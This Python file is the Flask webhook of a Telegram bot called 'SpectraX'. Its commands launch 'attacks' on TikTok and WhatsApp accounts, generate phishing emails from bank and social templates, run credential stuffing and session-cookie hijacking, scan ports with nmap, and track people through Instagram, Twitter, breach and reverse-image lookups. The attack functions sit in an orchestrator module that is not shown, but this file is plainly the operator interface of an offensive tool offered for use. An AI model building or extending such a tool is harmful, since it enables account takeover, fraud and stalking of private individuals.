import os
import json
import requests
import threading
import difflib
from flask import Flask, request, jsonify
from orchestrator import Orchestrator
from config import TELEGRAM_TOKEN, SUPER_ADMIN_ID

app = Flask(__name__)
orch = Orchestrator()
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# ---------- Alias mapping ----------
COMMAND_ALIASES = {
    '/start': ['/start', '❓ help', 'help'],
    '/track': ['/track', '🔍 track', 'track'],
    '/retrieve': ['/retrieve'],
    '/analyze': ['/analyze', '📊 analyze', 'analyze'],
    '/hack_tiktok': ['/hack_tiktok', '🎯 hack tiktok', 'hack tiktok'],
    '/hack_wa': ['/hack_wa', '📱 hack whatsapp', 'hack whatsapp'],
    '/verify': ['/verify', '✅ verify', 'verify'],
    '/list': ['/list', '📋 list', 'list'],
    # New commands
    '/breach': ['/breach'],
    '/whois': ['/whois'],
    '/dns': ['/dns'],
    '/reverseimage': ['/reverseimage'],
    '/phish': ['/phish'],
    '/stuff': ['/stuff'],
    '/session': ['/session'],
    '/report': ['/report'],
    '/virustotal': ['/virustotal'],
    '/nmap': ['/nmap'],
    '/instagram': ['/instagram'],
    '/twitter': ['/twitter'],
    '/diagnose': ['/diagnose'],
    '/model': ['/model'],
    '/add_admin': ['/add_admin'],
    '/remove_admin': ['/remove_admin'],
    '/list_admins': ['/list_admins'],
}

def get_command(text):
    text_lower = text.strip().lower()
    for canonical, aliases in COMMAND_ALIASES.items():
        if text_lower in [a.lower() for a in aliases]:
            return canonical
    # Fuzzy match
    all_aliases = [item for sublist in COMMAND_ALIASES.values() for item in sublist]
    matches = difflib.get_close_matches(text_lower, all_aliases, n=1, cutoff=0.6)
    if matches:
        for canonical, aliases in COMMAND_ALIASES.items():
            if matches[0] in [a.lower() for a in aliases]:
                return canonical
    return None

# ---------- Helpers ----------
def send_typing(chat_id):
    try:
        requests.post(f"{TELEGRAM_API}/sendChatAction",
                      json={"chat_id": chat_id, "action": "typing"},
                      timeout=5)
    except Exception:
        pass

def send_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    payload = {
        'chat_id': chat_id,
        'text': text[:4096],
        'parse_mode': parse_mode
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"Send failed: {e}")

def process_long_task(chat_id, func, *args, **kwargs):
    def wrapper():
        try:
            result = func(*args, **kwargs)
            if result is None:
                result = {'success': False, 'output': 'No result returned.'}
            # Serialize datetime objects
            def default_serializer(obj):
                if hasattr(obj, 'isoformat'):
                    return obj.isoformat()
                raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
            send_message(chat_id, json.dumps(result, indent=2, default=default_serializer))
        except Exception as e:
            send_message(chat_id, f"⚠️ <b>Error:</b> {str(e)}")
    thread = threading.Thread(target=wrapper)
    thread.daemon = True
    thread.start()

def get_main_keyboard():
    return {
        "keyboard": [
            ["🔍 Track", "📊 Analyze"],
            ["🎯 Hack TikTok", "📱 Hack WhatsApp"],
            ["📋 List", "✅ Verify"],
            ["🛡️ Diagnose", "📄 Report"],
            ["🌐 Instagram", "🐦 Twitter"],
            ["❓ Help"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def is_admin(chat_id):
    return chat_id == SUPER_ADMIN_ID or orch.admin.is_admin(chat_id)

# ---------- Routes ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data:
        return 'OK', 200

    if 'callback_query' in data:
        return 'OK', 200

    if 'message' not in data:
        return 'OK', 200

    msg = data['message']
    chat_id = msg['chat']['id']
    text = msg.get('text', '').strip()
    if not text:
        return 'OK', 200

    send_typing(chat_id)

    cmd = get_command(text)
    if cmd is None:
        if text.startswith('/'):
            cmd = text.split()[0].lower()
        else:
            send_message(chat_id, "❓ <b>Unknown command.</b> Type <code>/start</code> for help.")
            return 'OK', 200

    parts = text.split()
    args = parts[1:] if len(parts) > 1 else []

    try:
        # ---------- Existing commands ----------
        if cmd == '/start':
            reply = (
                "🤖 <b>SpectraX – Silent Intelligence</b>\n\n"
                "🔴 <b>Attack</b> – <code>/hack_tiktok</code> or <code>/hack_wa</code>\n"
                "🟢 <b>Analyze</b> – <code>/analyze &lt;target_id&gt;</code>\n"
                "🔵 <b>Track</b> – <code>/track &lt;identifier&gt;</code>\n"
                "🟣 <b>Verify</b> – <code>/verify &lt;tid&gt; &lt;platform&gt;</code>\n"
                "📋 <b>List</b> – <code>/list</code>\n"
                "🛡️ <b>Diagnose</b> – <code>/diagnose</code> (admin)\n"
                "📄 <b>Report</b> – <code>/report &lt;target_id&gt;</code>\n"
                "🌐 <b>Instagram</b> – <code>/instagram &lt;username&gt;</code>\n"
                "🐦 <b>Twitter</b> – <code>/twitter &lt;username&gt;</code>\n\n"
                "Use the buttons below or type commands directly."
            )
            send_message(chat_id, reply, reply_markup=get_main_keyboard())

        elif cmd == '/track':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/track &lt;identifier&gt;</code>\nExample: <code>/track john_doe</code>"
                send_message(chat_id, reply)
            else:
                ident = args[0]
                send_message(chat_id, "⏳ <b>Tracking...</b> Please wait.")
                threading.Thread(target=process_long_task, args=(chat_id, orch.track, ident)).start()

        elif cmd == '/retrieve':
            if len(args) < 2:
                reply = "❌ <b>Usage:</b> <code>/retrieve &lt;target_id&gt; &lt;platform&gt;</code>"
                send_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_message(chat_id, f"⏳ <b>Retrieving</b> from {plat}...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.retrieve, tid, plat)).start()
                except ValueError:
                    send_message(chat_id, "❌ <b>Invalid target ID.</b> Must be a number.")

        elif cmd == '/analyze':
            if not args or not args[0].isdigit():
                reply = "❌ <b>Usage:</b> <code>/analyze &lt;target_id&gt;</code>\nExample: <code>/analyze 5</code>"
                send_message(chat_id, reply)
            else:
                tid = int(args[0])
                send_message(chat_id, f"⏳ <b>Analyzing</b> target {tid}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.analyze, tid)).start()

        elif cmd == '/hack_tiktok':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                reply = "❌ <b>Usage:</b> <code>/hack_tiktok &lt;username&gt; &lt;attacker_email&gt;</code>"
                send_message(chat_id, reply)
            else:
                username, email = args[0], args[1]
                send_message(chat_id, f"⏳ <b>Launching</b> TikTok attack on {username}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_tiktok, username, email)).start()

        elif cmd == '/hack_wa':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ <b>Usage:</b> <code>/hack_wa &lt;phone&gt;</code>\nExample: <code>/hack_wa +2348012345678</code>"
                send_message(chat_id, reply)
            else:
                phone = args[0]
                send_message(chat_id, f"⏳ <b>Launching</b> WhatsApp attack on {phone}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_whatsapp, phone)).start()

        elif cmd == '/verify':
            if len(args) < 2:
                reply = "❌ <b>Usage:</b> <code>/verify &lt;target_id&gt; &lt;platform&gt;</code>"
                send_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_message(chat_id, f"⏳ <b>Verifying</b> {plat}...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.verify_target, tid, plat)).start()
                except ValueError:
                    send_message(chat_id, "❌ <b>Invalid target ID.</b> Must be a number.")

        elif cmd == '/list':
            send_message(chat_id, "⏳ <b>Fetching</b> target list...")
            threading.Thread(target=process_long_task, args=(chat_id, orch.list_targets)).start()

        # ---------- New feature commands ----------
        elif cmd == '/breach':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/breach &lt;email&gt;</code>"
                send_message(chat_id, reply)
            else:
                email = args[0]
                send_message(chat_id, f"⏳ <b>Checking</b> email breach for {email}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.breach_check, email)).start()

        elif cmd == '/whois':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/whois &lt;domain&gt;</code>"
                send_message(chat_id, reply)
            else:
                domain = args[0]
                send_message(chat_id, f"⏳ <b>Looking up</b> WHOIS for {domain}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.whois_lookup, domain)).start()

        elif cmd == '/dns':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/dns &lt;domain&gt;</code>"
                send_message(chat_id, reply)
            else:
                domain = args[0]
                send_message(chat_id, f"⏳ <b>Resolving</b> DNS for {domain}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.dns_enum, domain)).start()

        elif cmd == '/reverseimage':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/reverseimage &lt;image_url&gt;</code>"
                send_message(chat_id, reply)
            else:
                url = args[0]
                send_message(chat_id, f"⏳ <b>Searching</b> reverse image...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.reverse_image, url)).start()

        elif cmd == '/phish':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif len(args) < 1:
                reply = "❌ <b>Usage:</b> <code>/phish &lt;email&gt; [template]</code>\nTemplates: generic, bank, social"
                send_message(chat_id, reply)
            else:
                email = args[0]
                template = args[1] if len(args) > 1 else 'generic'
                send_message(chat_id, f"⏳ <b>Generating</b> phishing email...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.generate_phish, email, template)).start()

        elif cmd == '/stuff':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                reply = "❌ <b>Usage:</b> <code>/stuff &lt;username&gt; &lt;passwords&gt;</code>\nPasswords: comma-separated list"
                send_message(chat_id, reply)
            else:
                username = args[0]
                passwords = args[1].split(',')
                send_message(chat_id, f"⏳ <b>Attempting</b> credential stuffing...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.credential_stuff, username, passwords)).start()

        elif cmd == '/session':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ <b>Usage:</b> <code>/session &lt;cookie&gt;</code>"
                send_message(chat_id, reply)
            else:
                cookie = args[0]
                send_message(chat_id, f"⏳ <b>Testing</b> session cookie...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.session_hijack, cookie)).start()

        elif cmd == '/report':
            if not args or not args[0].isdigit():
                reply = "❌ <b>Usage:</b> <code>/report &lt;target_id&gt;</code>"
                send_message(chat_id, reply)
            else:
                tid = int(args[0])
                send_message(chat_id, f"⏳ <b>Generating</b> PDF report...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.generate_report_pdf, tid)).start()

        elif cmd == '/virustotal':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ <b>Usage:</b> <code>/virustotal &lt;ip&gt;</code>"
                send_message(chat_id, reply)
            else:
                ip = args[0]
                send_message(chat_id, f"⏳ <b>Querying</b> VirusTotal...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.virustotal_ip, ip)).start()

        elif cmd == '/nmap':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ <b>Usage:</b> <code>/nmap &lt;host&gt; [ports]</code>\nPorts optional (default: 1-1024)"
                send_message(chat_id, reply)
            else:
                host = args[0]
                ports = args[1] if len(args) > 1 else '1-1024'
                send_message(chat_id, f"⏳ <b>Scanning</b> ports...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.nmap_scan, host, ports)).start()

        elif cmd == '/instagram':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/instagram &lt;username&gt;</code>"
                send_message(chat_id, reply)
            else:
                username = args[0]
                send_message(chat_id, f"⏳ <b>Fetching</b> Instagram profile...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.instagram_profile, username)).start()

        elif cmd == '/twitter':
            if not args:
                reply = "❌ <b>Usage:</b> <code>/twitter &lt;username&gt;</code>"
                send_message(chat_id, reply)
            else:
                username = args[0]
                send_message(chat_id, f"⏳ <b>Fetching</b> Twitter profile...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.twitter_profile, username)).start()

        elif cmd == '/diagnose':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            else:
                send_message(chat_id, "⏳ <b>Running</b> diagnostics...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.run_diagnostics)).start()

        elif cmd == '/model':
            if not is_admin(chat_id):
                send_message(chat_id, "⛔ Admin only.")
            elif not args:
                providers = list(orch.ai.ai_manager.providers.keys())
                send_message(chat_id, f"Available: {', '.join(providers)}. Usage: /model <name>")
            else:
                model_name = args[0]
                result = orch.switch_ai_model(model_name)
                send_message(chat_id, json.dumps(result, indent=2))

        elif cmd == '/add_admin':
            if chat_id != SUPER_ADMIN_ID:
                send_message(chat_id, "⛔ Only the Super Admin can add admins.")
            elif not args:
                send_message(chat_id, "Usage: /add_admin <user_id>")
            else:
                try:
                    new_id = int(args[0])
                    orch.admin.add_admin(new_id)
                    send_message(chat_id, f"✅ User {new_id} added as admin.")
                except ValueError:
                    send_message(chat_id, "❌ Invalid user ID. Must be a number.")

        elif cmd == '/remove_admin':
            if chat_id != SUPER_ADMIN_ID:
                send_message(chat_id, "⛔ Only the Super Admin can remove admins.")
            elif not args:
                send_message(chat_id, "Usage: /remove_admin <user_id>")
            else:
                try:
                    rm_id = int(args[0])
                    orch.admin.remove_admin(rm_id)
                    send_message(chat_id, f"✅ User {rm_id} removed from admins.")
                except ValueError:
                    send_message(chat_id, "❌ Invalid user ID.")

        elif cmd == '/list_admins':
            if chat_id != SUPER_ADMIN_ID:
                send_message(chat_id, "⛔ Only the Super Admin can list admins.")
            else:
                admins = orch.admin.list_admins()
                if admins:
                    lines = [f"{row['user_id']} (added: {row['added_at']})" for row in admins]
                    reply = "Admins:\n" + "\n".join(lines)
                else:
                    reply = "No admins yet."
                send_message(chat_id, reply)

        else:
            reply = "❓ <b>Unknown command.</b> Type <code>/start</code> for help."
            send_message(chat_id, reply)

    except Exception as e:
        send_message(chat_id, f"⚠️ <b>Unexpected error:</b> {str(e)}")

    return 'OK', 200

# ---------- Health & Test ----------
@app.route('/health', methods=['GET'])
def health():
    try:
        from modules.utils import get_db_connection
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT 1")
        cur.close()
        conn.close()
        db_ok = True
    except Exception as e:
        db_ok = False
        print(f"Health DB check failed: {e}")
    # Fixed: use ai_manager instead of groq_client
    ai_ok = bool(orch.ai.ai_manager.active_provider) if hasattr(orch.ai, 'ai_manager') else False
    return jsonify({
        "status": "ok" if db_ok else "degraded",
        "database": db_ok,
        "ai": ai_ok,
        "service": "SpectraX"
    }), 200 if db_ok else 503

@app.route('/test_ai', methods=['GET'])
def test_ai():
    try:
        result = orch.ai.ai_manager.generate("Say 'hello' in one word.")
        return f"AI works! Response: {result}"
    except Exception as e:
        return f"AI error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
